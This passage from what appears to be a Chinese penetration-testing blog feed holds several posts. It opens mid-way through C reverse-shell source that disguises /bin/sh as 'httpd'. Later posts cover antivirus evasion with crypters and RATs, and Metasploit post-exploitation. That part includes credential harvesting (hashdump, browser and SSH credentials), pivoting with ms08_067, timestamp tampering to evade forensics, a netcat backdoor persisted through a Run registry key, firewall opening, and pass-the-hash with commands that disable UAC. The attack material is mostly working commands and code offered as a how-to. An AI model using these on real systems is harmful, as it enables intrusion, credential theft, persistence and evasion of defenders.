class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">sock.sin_family  = AF_INET;</span><br><span class="line">sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">connect</span>(s,(struct sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">dup2(s,<span class="number">0</span>);</span><br><span class="line">dup2(s,<span class="number">1</span>);</span><br><span class="line">dup2(s,<span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"httpd"</span>,(<span class="keyword">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>windows.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET Winsock;</span><br><span class="line">SOOKET Sock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line"><span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"><span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>) </span><br><span class="line">&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line"><span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">hax.sin_family = AF_INET;</span><br><span class="line">hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span class="line">ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;生成反弹shell&quot;&gt;&lt;a href=&quot;#生成反弹shell&quot; class=&quot;headerlink&quot; title=&quot;生成反弹shell&quot;&gt;&lt;/a&gt;&lt;strong&gt;生成反弹shell&lt;/strong&gt;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p windo
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
    
      <category term="strings" scheme="http://c.cat.plus/tags/strings/"/>
    
      <category term="C" scheme="http://c.cat.plus/tags/C/"/>
    
      <category term="gcc" scheme="http://c.cat.plus/tags/gcc/"/>
    
      <category term="wine" scheme="http://c.cat.plus/tags/wine/"/>
    
  </entry>
  
  <entry>
    <title>恶意程序及免杀技术现状</title>
    <link href="http://c.cat.plus/2016/08/03/Avoid_Killing/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E7%8E%B0%E7%8A%B6/"/>
    <id>http://c.cat.plus/2016/08/03/Avoid_Killing/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%8F%8A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E7%8E%B0%E7%8A%B6/</id>
    <published>2016-08-03T09:15:31.000Z</published>
    <updated>2020-06-10T08:31:40.420Z</updated>
    
    <content type="html"><![CDATA[<h4 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a><strong>恶意软件</strong></h4><ul><li>病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序</li><li>在用户非自愿的情况下执行安装</li><li>出于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击…</li></ul><h4 id="防病毒软件"><a href="#防病毒软件" class="headerlink" title="防病毒软件"></a><strong>防病毒软件</strong></h4><ul><li><p>恶意程序最主要的防护手段</p><p>  杀毒软件/防病毒软件<br>  客户端/服务器/邮件防病毒</p></li><li><p>检测原理</p><p>  基于二进制文件中特种签名的黑名单检测方法<br>  于行为的分析方法(启发式)</p></li><li><p>事后手段</p><p>  永远落后于病毒发展</p></li></ul><h4 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a><strong>免杀技术</strong></h4><ul><li><p>修改二进制文件中的特征字符</p><p>  替换、擦除、修改</p></li><li><p>加密技术(crypter)</p><p>  通过加密使得特征字符不可读,从而逃避AV检测<br>  运行时分片分段的解密执行,注入进程或AV不检查的无害文件中</p></li><li><p>防病毒软件的检测</p><p>  恶意程序本身的特征字符<br>  加密器crypter的特征字符</p></li></ul><blockquote><h3 id="当前现状"><a href="#当前现状" class="headerlink" title="当前现状"></a><strong>当前现状</strong></h3></blockquote><p><strong>恶意软件制造者</strong></p><ul><li>编写私有RAT软件,避免普遍被AV所知的特征字符</li><li>使用独有crypter软件加密恶意程序</li><li>处事低调，尽量避免被发现</li><li>没有能力自己编写而已代码的黑客,通过直接修改特征码的方式免杀</li><li>Fully UnDetectable是最高追求(FUD)</li></ul><p><strong>AV厂商</strong></p><ul><li>广泛采集样本,尽快发现新出现的而已程序,更新病毒库</li><li>一般新的恶意软件安全UD窗口期是一周左右</li><li>与恶意软件制造者永无休止的拉锯战</li><li>新的启发式检测技术尚有待完善(误杀漏杀)</li></ul><p><strong>单一AV广商的病毒库很难达到100%覆盖</strong></p><ul><li><p><code>https://www.virustotal.com/</code><br>  接口被某些国家的AV软件免费利用，没有自己的病毒库</p></li><li><p><code>http://www.virscan.org/</code></p></li><li><p>在线多引擎查杀网站与AV厂商共享信息</p></li><li><p>搞黑的在线多引擎查毒站</p></li><li><p><code>https://nodistribute.com/</code></p></li><li><p><code>http://viruscheckmate.com/check/</code></p></li></ul><p><strong>常用RAT软件</strong></p><ul><li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li></ul><h4 id="NanoCore-Bate-Release"><a href="#NanoCore-Bate-Release" class="headerlink" title="NanoCore - Bate Release"></a><strong>NanoCore</strong> - Bate Release</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;恶意软件&quot;&gt;&lt;a href=&quot;#恶意软件&quot; class=&quot;headerlink&quot; title=&quot;恶意软件&quot;&gt;&lt;/a&gt;&lt;strong&gt;恶意软件&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;病毒、木马、蠕虫、键盘记录、僵尸程序、流氓软件、勒索软件、广告程序&lt;/li&gt;

      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="RAT" scheme="http://c.cat.plus/tags/RAT/"/>
    
      <category term="NanoCore" scheme="http://c.cat.plus/tags/NanoCore/"/>
    
      <category term="crypter" scheme="http://c.cat.plus/tags/crypter/"/>
    
  </entry>
  
  <entry>
    <title>MsF后渗透测试阶段之meterpreter脚本及post模块</title>
    <link href="http://c.cat.plus/2016/03/15/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8Bmeterpreter%E8%84%9A%E6%9C%AC%E5%8F%8Apost%E6%A8%A1%E5%9D%97/"/>
    <id>http://c.cat.plus/2016/03/15/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8Bmeterpreter%E8%84%9A%E6%9C%AC%E5%8F%8Apost%E6%A8%A1%E5%9D%97/</id>
    <published>2016-03-15T10:35:18.000Z</published>
    <updated>2020-07-07T09:08:37.985Z</updated>
    
    <content type="html"><![CDATA[<h4 id="POST-模块-在已经取得meterpreter之后使用的模块"><a href="#POST-模块-在已经取得meterpreter之后使用的模块" class="headerlink" title="POST 模块(在已经取得meterpreter之后使用的模块)"></a><strong>POST 模块</strong>(在已经取得meterpreter之后使用的模块)</h4><p><strong>获取meterpreter</strong></p><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 1.1.1.1set exitonsession false        #持续侦听端口配置参数exploit -j -z</code></pre><p><strong>常用POST模块</strong>    </p><pre><code>#在meterpreter下输入run按tab键会提示有大量POST模块和脚本run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24    #扫描目标网段run post/windows/gather/checkvm        #检查是否为虚拟机run post/windows/gather/credentials/credential_collector    #获取目标机器账号等身份认证信息run post/windows/gather/enum_applications        #获取目标机器安装的应用程序run post/windows/gather/enum_logged_on_users    #获取目标系统正在登录中的账号run post/windows/gather/enum_snmp                #查看目标系统是否开启snmp服务run post/multi/recon/local_exploit_suggester    #获取目标系统可用来本地提权的漏洞信息run post/windows/manage/delete_user USERNAME=yuanfh        #删除目标系统账号run post/multi/gather/env                #获取目标系统一些敏感信息run post/multi/gather/firefox_creds        #收集firefox浏览器保存的密码信息run post/multi/gather/ssh_creds            #获取本地保存的SSH身份验证信息,适用linuxrun post/multi/gather/check_malware REMOTEFILE=c:\\a.exe    #检查目标系统的某个程序是否为恶意程序</code></pre><h4 id="另一种运行POST模块的方法"><a href="#另一种运行POST模块的方法" class="headerlink" title="另一种运行POST模块的方法"></a><strong>另一种运行POST模块的方法</strong></h4><p><strong>自动执行meterpreter脚本</strong></p><pre><code>show advanced        #显示高级设置参数set AutoRunScript hostsedit -e 1.1.1.1,www.baidu.com    #进入meterpreter自动修改hosts文件set InitialAutoRunScript checkvm</code></pre><p><strong>利用高级设置参数自动执行POST模块</strong></p><pre><code>set InitialAutoRunScript migrate -n explorer.exe    #需先设置迁移目标用户权限的进程set AutoRunScript post/windows/gather/dumplinks        #再设置获取最近打开文档路径</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;POST-模块-在已经取得meterpreter之后使用的模块&quot;&gt;&lt;a href=&quot;#POST-模块-在已经取得meterpreter之后使用的模块&quot; class=&quot;headerlink&quot; title=&quot;POST 模块(在已经取得meterpreter之后使用的模
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="dumplinks" scheme="http://c.cat.plus/tags/dumplinks/"/>
    
      <category term="hosts编辑" scheme="http://c.cat.plus/tags/hosts%E7%BC%96%E8%BE%91/"/>
    
      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
    
      <category term="迁移进程" scheme="http://c.cat.plus/tags/%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>MsF后渗透测试阶段之跳板利用及端口转发</title>
    <link href="http://c.cat.plus/2016/03/14/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E8%B7%B3%E6%9D%BF%E5%88%A9%E7%94%A8%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <id>http://c.cat.plus/2016/03/14/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E8%B7%B3%E6%9D%BF%E5%88%A9%E7%94%A8%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
    <published>2016-03-14T14:25:16.000Z</published>
    <updated>2020-07-07T09:09:06.705Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Pivoting-跳板-枢纽-支点"><a href="#Pivoting-跳板-枢纽-支点" class="headerlink" title="Pivoting 跳板 / 枢纽 / 支点"></a><strong>Pivoting</strong> 跳板 / 枢纽 / 支点</h4><ul><li>利用已经控制的一台计算机作为入侵内网的跳板</li><li>在其他内网计算机看来访问全部来自于跳板机</li><li><code>run autoroute -s 1.1.1.0/24</code><br>  #不能访问外网的被攻击目标内网网段</li></ul><p><strong>自动路由 现实场景</strong></p><ul><li>利用win 7攻击内网XP(对比xp有无外网访问权的情况)</li><li>扫描内网辅助模块: <code>auxiliary/scanner/portscan/tcp</code></li></ul><pre><code>use auxiliary/scanner/portscan/tcpshow optionsset rhosts 2.1.1.0/24set ports 139,445exploitdb_nmap -sV -p 445 2.1.1.11use exploit/windows/smb/ms08_067_netapishow optionsset rhost 2.1.1.11        #设置目标内网被攻击IPset payload windows/meterpreter/reverse_tcpset lhost 2.1.1.10        #设置反弹连接IP为跳板机set target 34</code></pre><p><strong>Pivoting之端口转发Portfwd</strong></p><ul><li>利用已经被控计算机,在kali与被攻击目标之间实现端口转发</li><li>也需要在已有session的前提下进入meterpreter内使用  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -L LIP -l LPORT -r RIP -p RPORT#添加端口转发规则</span><br><span class="line">portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389</span><br><span class="line">portfwd list #查看已添加列表</span><br><span class="line">portfwd delete#删除某条规则</span><br><span class="line">portfwd flush#删除全部规则</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Pivoting-跳板-枢纽-支点&quot;&gt;&lt;a href=&quot;#Pivoting-跳板-枢纽-支点&quot; class=&quot;headerlink&quot; title=&quot;Pivoting 跳板 / 枢纽 / 支点&quot;&gt;&lt;/a&gt;&lt;strong&gt;Pivoting&lt;/strong&gt; 跳板 / 
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
    
      <category term="跳板机" scheme="http://c.cat.plus/tags/%E8%B7%B3%E6%9D%BF%E6%9C%BA/"/>
    
      <category term="portfwd" scheme="http://c.cat.plus/tags/portfwd/"/>
    
      <category term="autoroute" scheme="http://c.cat.plus/tags/autoroute/"/>
    
  </entry>
  
  <entry>
    <title>MsF后渗透测试阶段之抓包及MACE时间修改</title>
    <link href="http://c.cat.plus/2016/03/13/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%8A%93%E5%8C%85%E5%8F%8AMACE%E6%97%B6%E9%97%B4%E4%BF%AE%E6%94%B9/"/>
    <id>http://c.cat.plus/2016/03/13/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%8A%93%E5%8C%85%E5%8F%8AMACE%E6%97%B6%E9%97%B4%E4%BF%AE%E6%94%B9/</id>
    <published>2016-03-13T09:55:56.000Z</published>
    <updated>2020-07-06T15:54:47.769Z</updated>
    
    <content type="html"><![CDATA[<p><strong>抓包</strong>(meterpreter)</p><pre><code>load sniffersniffer_interfacessniffer_start 2sniffer_dump 2 1.cap / sniffer_dump 2 1.cap</code></pre><ul><li>在内存中缓存区块循环存储抓包(50000包),不写磁盘</li><li>智能过滤meterpreter流量,传输全程使用SSL/TLS加密</li></ul><p><strong>解码</strong></p><pre><code>use auxiliary/sniffer/psnuffleset PCAPFILE /root/1.cap</code></pre><p><strong>搜索文件</strong><br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search -f *.ini</span><br><span class="line">search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.docx</span><br></pre></td></tr></table></figure></p><h4 id="John-the-Ripper-破解弱口令"><a href="#John-the-Ripper-破解弱口令" class="headerlink" title="John the Ripper 破解弱口令"></a><strong>John the Ripper 破解弱口令</strong></h4><pre><code>use post/windows/gather/hashdump        #system权限的meterpreterrun        #结果保存在/tmp目录下use auxiliary/analyze/jtr_crack_fastrun</code></pre><ul><li>文件系统访问会留下痕迹,电子取证重点关注</li><li>渗透测试和攻击者往往希望销毁文件系统访问痕迹</li><li>最好的避免被电子取证发现的方法:不要碰文件系统<ul><li>meterpreter的先天优势所在(完全基于内存)</li></ul></li></ul><p><strong>MAC时间</strong>(Modified Accessed Changed)</p><pre><code>ls -l --time=atime/mtime/ctime 1.txt    #查看MAC时间stat 1.txt                                #查看MAC时间touch -d &quot;2 days ago&quot; 1.txt                #修改MAC时间touch -t 1501010101 1.txt                #修改MAC时间</code></pre><ul><li>MACE:MFT entry<ul><li>MFT:NTFS文件系统的主文件分配表Master File Table</li><li>通常1024字节或2个硬盘扇区,其中存放多项entry信息</li><li>包含文件大量信息(大小,名称,目录位置,硬盘位置,创建日期)</li><li>更多信息可研究文件系统取证分析技术</li></ul></li></ul><p><strong>Timestomp</strong>(meterpreter)</p><pre><code>timestomp -v 1.txttimestomp -f c:\\autoexec.bat 1.txt        #指定一个文件模板改时间-b -r        #擦除MACE时间信息,目前此参数功能失效-m / -a / -c / -e / -z        #单独修改时间参数timestomp -z &quot;MM/DD/YYYY HH24:MI:SS&quot; 2.txt        #统一修改所有时间</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;抓包&lt;/strong&gt;(meterpreter)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;load sniffer
sniffer_interfaces
sniffer_start 2
sniffer_dump 2 1.cap / sniffer_dump 2 1.c
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="John" scheme="http://c.cat.plus/tags/John/"/>
    
      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
    
      <category term="sniffer" scheme="http://c.cat.plus/tags/sniffer/"/>
    
      <category term="MACE时间修改" scheme="http://c.cat.plus/tags/MACE%E6%97%B6%E9%97%B4%E4%BF%AE%E6%94%B9/"/>
    
  </entry>
  
  <entry>
    <title>MsF后渗透测试阶段之注册表修改</title>
    <link href="http://c.cat.plus/2016/03/13/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BF%AE%E6%94%B9/"/>
    <id>http://c.cat.plus/2016/03/13/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BF%AE%E6%94%B9/</id>
    <published>2016-03-12T20:15:51.000Z</published>
    <updated>2020-07-06T09:35:28.541Z</updated>
    
    <content type="html"><![CDATA[<p><strong>注册表保存着windows几乎全部配置参数</strong></p><ul><li>如果修改不当,可直接造成系统崩溃</li><li>修改前完整备份注册表</li><li>某些注册表的修改是不可逆的</li></ul><p><strong>常见用途</strong></p><ul><li>修改,增加启动项</li><li>窃取存储于注册表中的机密信息</li><li>绕过文件型病毒查杀</li></ul><h4 id="用注册表添加NC后门服务-meterpreter"><a href="#用注册表添加NC后门服务-meterpreter" class="headerlink" title="用注册表添加NC后门服务(meterpreter)"></a><strong>用注册表添加NC后门服务</strong>(meterpreter)</h4><pre><code>#上传NC工具到目标Windowsupload /usr/share/windows-binaries/nc.exe C:\\windows\\system32#使用reg子命令查询注册表键值reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run#增加nc子键值并配置nc正向连接参数,-d 静默执行 -L断开连接后不关闭端口reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &apos;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&apos;#查询是否添加成功reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</code></pre><p><strong>打开防火墙端口</strong>(meterpreter)</p><pre><code>execute -f cmd -i -H    #进入交互式SHELLnetsh firewall show opmode    #查询防火墙状态netsh firewall add portopening TCP 444 &quot;test&quot; ENABLE ALL    #添加一条test规则并启动shutdown -r -t 0nc 1.1.1.1 444</code></pre><p><strong>其它注册表项</strong></p><pre><code>`https://support.accessdata.com/hc/en-us/articles/204448155-RegistryQuick-Find-Chart`</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;注册表保存着windows几乎全部配置参数&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果修改不当,可直接造成系统崩溃&lt;/li&gt;
&lt;li&gt;修改前完整备份注册表&lt;/li&gt;
&lt;li&gt;某些注册表的修改是不可逆的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;常见用
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
    
      <category term="注册表" scheme="http://c.cat.plus/tags/%E6%B3%A8%E5%86%8C%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>MsF后渗透测试阶段之常用操作</title>
    <link href="http://c.cat.plus/2016/03/11/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"/>
    <id>http://c.cat.plus/2016/03/11/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/</id>
    <published>2016-03-11T13:51:11.000Z</published>
    <updated>2020-07-06T09:35:17.677Z</updated>
    
    <content type="html"><![CDATA[<p><strong>meterpreter</strong></p><pre><code>load privhashdump</code></pre><h4 id="Psexec-模块之Passthehash"><a href="#Psexec-模块之Passthehash" class="headerlink" title="Psexec 模块之Passthehash"></a><strong>Psexec 模块之Passthehash</strong></h4><ul><li><p><strong>利用hash直接登录目标windows系统</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</span><br><span class="line">set smbuser cat</span><br><span class="line">set smbpass hash</span><br><span class="line">set rhost 192.168.254.110</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.190.137</span><br></pre></td></tr></table></figure></li><li><p><strong>需要提前关闭UAC</strong> (meterpreter下依次执行以下指令)</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v EnableLUA &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br><span class="line">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br><span class="line">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 